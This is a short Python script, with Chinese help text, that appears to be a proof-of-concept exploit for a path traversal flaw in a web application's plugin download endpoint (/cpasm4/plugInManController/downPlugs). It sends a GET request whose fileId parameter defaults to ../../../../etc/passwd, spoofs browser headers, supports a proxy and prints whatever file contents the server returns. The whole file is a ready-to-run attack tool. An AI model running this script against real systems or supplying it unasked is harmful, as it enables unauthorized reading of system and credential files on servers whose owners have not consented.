import requests
import argparse

parser = argparse.ArgumentParser(description="发送自定义参数的 HTTP GET 请求，支持路径遍历漏洞测试。")

parser.add_argument("-u", "--url", required=True, help="目标 URL（例如 http://example.com）")
parser.add_argument("-f", "--fileid", default="../../../../etc/passwd", help="fileId 参数值（默认：../../../../etc/passwd）")
parser.add_argument("-n", "--filename", default="", help="fileName 参数值（默认：空）")
parser.add_argument("-H", "--host", default="example.com", help="Host 头（默认：example.com）")
parser.add_argument("-t", "--timeout", type=int, default=10, help="请求超时时间（默认：10 秒）")
parser.add_argument("-p", "--proxy", help="代理服务器地址（例如 http://your-proxy:port）")
parser.add_argument("-a", "--useragent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", help="User-Agent 头（默认：Chrome）")
parser.add_argument("-A", "--accept", default="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", help="Accept 头（默认：text/html,...）")

args = parser.parse_args()

headers = {
    "Host": args.host,
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": args.useragent,
    "Accept": args.accept,
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

proxies = None
if args.proxy:
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }

full_url = f"{args.url.rstrip('/')}/cpasm4/plugInManController/downPlugs?fileId={args.fileid}&fileName={args.filename}"

try:
    response = requests.get(full_url, headers=headers, proxies=proxies, timeout=args.timeout)
    response.raise_for_status()
    print("响应内容：")
    print(response.text)
except requests.exceptions.Timeout:
    print("请求超时，请检查网络或增加超时时间。")
except requests.exceptions.ConnectionError:
    print("连接失败，请检查目标服务器是否可达。")
except requests.exceptions.HTTPError as e:
    print(f"HTTP 错误: {e}")
except requests.exceptions.RequestException as e:
    print(f"请求失败: {e}")
